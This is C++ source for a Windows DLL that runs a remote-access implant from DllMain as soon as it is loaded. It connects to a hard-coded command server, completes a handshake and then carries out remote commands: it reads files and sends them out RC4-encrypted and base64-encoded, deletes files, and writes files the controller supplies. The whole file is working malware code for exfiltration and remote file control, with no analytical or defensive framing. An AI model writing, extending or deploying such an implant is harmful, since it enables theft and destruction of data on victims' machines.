#include "NetClient.h"
#include "Commands.h"
#include "JsonParser.h"
#include "Payload.h"
#include "RC4.h"

#include <boost/beast/core/detail/base64.hpp>

using namespace boost::beast::detail;

BOOL WINAPI DllMain(_In_ HINSTANCE hinstDLL, _In_ DWORD fdwReason, _In_ LPVOID lpvReserved)
{
	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		NetClient* client = new NetClient();
		client->generate_uuid();
		client->connect("192.168.1.71", 63792);

		std::string handshake_request = "{\"request\":\"handshake\", ";
		handshake_request += "\"uuid\":\"" + client->get_uuid() + "\"}";
		client->send(handshake_request);
		if (JsonParser::extract_json<std::string>(client->recv(), "handshake") != "OK")
			return 1;
		
		std::string initialized = "{\"initialized\":1}";
		client->send(initialized);

		for (;;)
		{
			switch (Commands::get_str_enum(client->recv_command()))
			{
			case Commands::INVALID:
				break;
			case Commands::READ_FILE:
			{
				std::string fdata_raw = Payload::read_file(JsonParser::extract_json<std::string>(client->get_last_cmd(), "fname"));

				std::vector<BYTE> plain(fdata_raw.begin(), fdata_raw.end());
				std::vector<BYTE> cipher(plain.size());
				RC4::Encrypt(&Payload::key, &plain, &cipher);

				std::string encrypted_str(cipher.begin(), cipher.end());
				std::string encrypted_str_b64 = base64_encode(encrypted_str);

				client->send("{\"content\": \"" + encrypted_str_b64 + "\"}");
				
				// fill string with 0
				for (int i = 0; i < fdata_raw.size(); ++i)
					fdata_raw[i] = 0x0;

				break;
			}
			case Commands::DELETE_FILE:
			{
				Payload::delete_file(JsonParser::extract_json<std::string>(client->get_last_cmd(), "fname"));
				client->send("{\"file_deleted\":\"1\"}");
				break;
			}
			case Commands::CREATE_FILE:
			{
				std::string fdata_raw = JsonParser::extract_json<std::string>(client->get_last_cmd(), "fdata");
				Payload::write_file(JsonParser::extract_json<std::string>(client->get_last_cmd(), "fname"), std::vector <BYTE>(fdata_raw.begin(), fdata_raw.end()));
				client->send("{\"file_created\":\"1\"}");
				break;
			}
			default:
				break;
			}
		}
	}
	return TRUE;
}